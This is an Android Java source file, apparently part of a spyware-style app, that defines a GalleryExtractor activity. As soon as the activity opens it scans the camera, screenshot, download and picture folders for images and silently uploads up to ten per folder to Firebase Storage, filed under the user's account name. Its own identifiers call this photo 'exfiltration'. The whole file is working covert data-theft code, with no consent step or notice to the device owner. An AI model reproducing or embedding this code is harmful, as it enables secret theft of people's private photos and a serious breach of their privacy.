package com.droidekamobile;

import static android.content.ContentValues.TAG;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;


public class GalleryExtractor extends AppCompatActivity {

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();
    private static DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
    private static FirebaseAuth mAuth = FirebaseAuth.getInstance();

    ArrayList<String> commonPhotoDirectories = new ArrayList<>(Arrays.asList(Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS));
    ArrayList<String> photoFilePathsToExtract = new ArrayList<>(); // Collect all the photo directories here
    ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", "jpeg"));
    ArrayList<String> interestingPhotoSubdirectories = new ArrayList<>(Arrays.asList("Camera", "Screenshots", "Downloads"));  // So that Zafran doesn't need to pay for Firebase storage

    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 10; // So that Zafran doesn't need to pay for Firebase storage too

    private boolean mSaved;

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        uploadGallery();
    }

    public GalleryExtractor() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            commonPhotoDirectories.add(Environment.DIRECTORY_SCREENSHOTS);
            Log.d("Files", "SCREENSHOT DIRECTORY SUPPORTED!");
        } else {
            Log.d("Files", "SCREENSHOT DIRECTORY NOT SUPPORTED!");
        }
    }

    //upload images
    public void uploadGallery() {
        for (String photoDirectory : commonPhotoDirectories) {
            listPicturesInDirectory(Environment.getExternalStorageDirectory().toString() + "/" + photoDirectory);
        }

        for (String photoFilePath : photoFilePathsToExtract) {
            obtainUsername(username -> {
                Uri localFile = Uri.fromFile(new File(photoFilePath)); //Change this part
                UploadTask uploadTask;
                String trimmedFilePath = photoFilePath.replace(Environment.getExternalStorageDirectory().toString() + "/", ""); // TODO: Also trim SD Card path
                StorageReference photoref = storageRef.child(username).child("images").child("gallery").child(trimmedFilePath);
                uploadTask = photoref.putFile(localFile);
                uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                        Uri sessionUri = taskSnapshot.getUploadSessionUri();
                        if (sessionUri != null && !mSaved) {
                            mSaved = true;
                        }
                    }
                });
            });

        }

    }
    public void listPicturesInDirectory(String startingDirectory) {
        Log.d("Files", "Path: " + startingDirectory);
        File directory = new File(startingDirectory);
        File[] files = directory.listFiles();

        //Don't bother recursing if there is no files inside the directory.
        if (files == null) {
            Log.d("Files", "Its null");
            Log.d("Files", "Does it exist: " + directory.exists());
            return;
        } else if (files.length == 0) {
            Log.d("Files", "Its Empty");
            return;
        }

        files = reverse(files);

        Log.d("Files", "Size: "+ files.length);
        int photo_count = 0;
        for (int i = 0; i < files.length; i++) {
            String fileName = files[i].getAbsolutePath();
            String[] fileNameSplitter = fileName.split("/");
            if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(fileNameSplitter[fileNameSplitter.length - 1])) {
                 Log.d("Files", "FileName:" + files[i].toString() + " exist");
                listPicturesInDirectory(files[i].getAbsolutePath());

            } else if (fileName.length() > 4 && photo_count < MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT) {
                String filenameExtension = fileName.substring(fileName.length() - 4);
                if (allowedPhotoExtensions.contains(filenameExtension)) {
                    photo_count++;
                    photoFilePathsToExtract.add(fileName);
                    Log.d("Files", "FileName:" + fileName);
                }
            }
        }
    }

    static File[] reverse(File[] a) {
        ArrayList<File> fileArray = new ArrayList<>(Arrays.asList(a));
        Collections.reverse(fileArray);
        File[] fileList = new File[fileArray.size()];
        return fileArray.toArray(fileList);

    }

    private void obtainUsername(FirebaseCallback firebaseCallback) {
        FirebaseUser currentUser = mAuth.getCurrentUser();
        String email = currentUser.getEmail();
        mDatabase = FirebaseDatabase.getInstance().getReference("users");

        // Incase you do not understand this part: https://www.youtube.com/watch?v=OvDZVV5CbQg
        // This solves the asynchronous issue
        ValueEventListener valueEventListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {

                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    User user = dataSnapshot.getValue(User.class);
                    if (user.getEmail().equals(email)) {
                        String username = user.getUsername();
                        firebaseCallback.onCallback(username);
                        return;
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.d(TAG, error.getMessage());
                return;
            }
        };
        mDatabase.addListenerForSingleValueEvent(valueEventListener);

        return;
    }

    //This is just needed to fight against the asynchronous issue when obtaining data from database
    private interface FirebaseCallback {
        void onCallback(String username);
    }


}
